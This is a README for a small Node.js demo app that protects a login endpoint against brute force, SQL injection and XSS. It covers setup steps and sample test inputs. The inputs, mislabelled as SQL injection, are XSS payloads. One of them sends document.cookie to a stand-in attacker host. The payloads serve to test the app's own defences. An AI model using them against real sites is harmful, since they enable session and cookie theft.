# Simple Web Security App

This project demonstrates a simple web application that includes features like brute force protection, SQL injection prevention, and XSS mitigation.
  
## Installation

Follow the steps below to set up the project on your local machine.

### 1. Create a New Project Directory
Open your terminal and create a new directory for your project:
```bash
mkdir my-web-security-app
cd my-web-security-app
```

### 2. Initialize a Node.js Project
Run the following command to initialize a new Node.js project and create the package.json file:
```bash
npm init -y

```

### 3. Install Required Dependencies
```bash
npm install express cors

```
### 4. Test Using Postman

- Open Postman (download it if you don't have it: [Download Postman](https://www.postman.com/downloads/)).
- Create a new POST request to `http://localhost:3000/login` with the appropriate `username` and `password` parameters.

### 5. Start the Server
```bash
node server.js

```
### 6. Error Occur express-rate-limit [MODULE NOT FOUND] 
```bash
npm install express-rate-limit

```
### 7. Error Occur node-cache [MODULE NOT FOUND] 
```bash
npm install node-cache

```

### Others
```bash
netstat -ano | findstr :3000
taskkill /PID ID /F
```
### Sample Inputs
```bash
USERNAME AND PASSWORD

{
  "username": "joxyle",
  "password": "jhon"
}

SQL INJECTION
{
  "username": "<script>alert('XSS')</script>",
  "password": "password123"
}
{
  "username": "<img src='x' onerror='alert(1)'>",
  "password": "password123"
}
{
  "username": "<img src='nonexistent.jpg' onload='alert(\"XSS\")'>",
  "password": "password123"
}
{
  "username": "<script>fetch('http://attacker.com?cookie=' + document.cookie)</script>",
  "password": "password123"
}
{
  "username": "<img src='x' onerror='eval(atob(\"YWxlcnQoJ1hTUycp\")' />",
  "password": "password123"
}

```
